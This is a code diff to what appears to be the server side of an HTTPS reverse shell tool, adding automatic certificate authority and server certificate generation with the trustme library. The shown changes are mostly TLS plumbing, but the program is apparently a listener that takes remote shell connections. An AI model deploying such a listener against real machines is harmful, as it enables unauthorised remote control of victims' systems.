@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell
+# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
@@ -8,6 +8,8 @@ import ssl
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from urllib.parse import parse_qs
+
+from trustme import CA
 
 
 class ShellHandler(BaseHTTPRequestHandler):
@@ -51,22 +53,53 @@ class ShellHandler(BaseHTTPRequestHandler):
 
 
 class ShellServer:
-    def __init__(self, host: str, port: int, certfile: [str, Path]):
+    def __init__(self,
+                 host: str,
+                 port: int, *,
+                 server_cert: [str, Path] = None,
+                 ca_cert: [str, Path] = None,
+                 ca_private_key: [str, Path] = None):
         self._host = host
         self._port = port
-        self._certfile = certfile
+        self._ca = None
+        self.ca_private_key = ca_private_key
+        self.ca_cert = ca_cert
+        self.server_cert = server_cert
         self.server_address = self._host, self._port
 
     @property
-    def _certfile(self) -> Path:
-        return self.__certfile
+    def ca_cert(self) -> Path:
+        return self._ca_cert
 
-    @_certfile.setter
-    def _certfile(self, path: [str, Path]):
-        self.__certfile = Path(path)
-        if not self.__certfile.exists():
-            raise FileNotFoundError("Error: A server certificate is required "
-                                    "to start the application.")
+    @ca_cert.setter
+    def ca_cert(self, path: [str, Path, None]):
+        try:
+            self._ca_cert = Path(path)
+            if self.ca_private_key is None:
+                raise SystemExit("The private key for the Certificate "
+                                 "Authority is required for signing new client "
+                                 "certificates.")
+            self._ca = CA.from_pem(
+                cert_bytes=bytes(self._ca_cert),
+                private_key_bytes=bytes(self.ca_private_key))
+        except TypeError:
+            self._ca_cert = Path(__file__).parent.joinpath("ca.pem")
+            self._ca = CA()
+            self._ca.cert_pem.write_to_path(str(self._ca_cert))
+
+    @property
+    def server_cert(self) -> Path:
+        return self._server_cert
+
+    @server_cert.setter
+    def server_cert(self, path: [str, Path, None]):
+        try:
+            self._server_cert = Path(path)
+        except TypeError:  # path is None
+            self._server_cert = Path(__file__).parent.joinpath("server.pem")
+            server_cert = self._ca.issue_cert(self._host)
+            server_cert.private_key_and_cert_chain_pem.write_to_path(
+                str(self._server_cert))
 
     def execute(self) -> None:
         with HTTPServer(self.server_address, ShellHandler) as httpd:
@@ -76,7 +109,7 @@ class ShellServer:
                 print("[+] Waiting for connections...\n")
                 httpd.socket = ssl.wrap_socket(sock=httpd.socket,
                                                server_side=True,
-                                               certfile=str(self._certfile),
+                                               certfile=str(self.server_cert),
                                                ssl_version=ssl.PROTOCOL_TLS)
                 httpd.serve_forever()
             except KeyboardInterrupt:
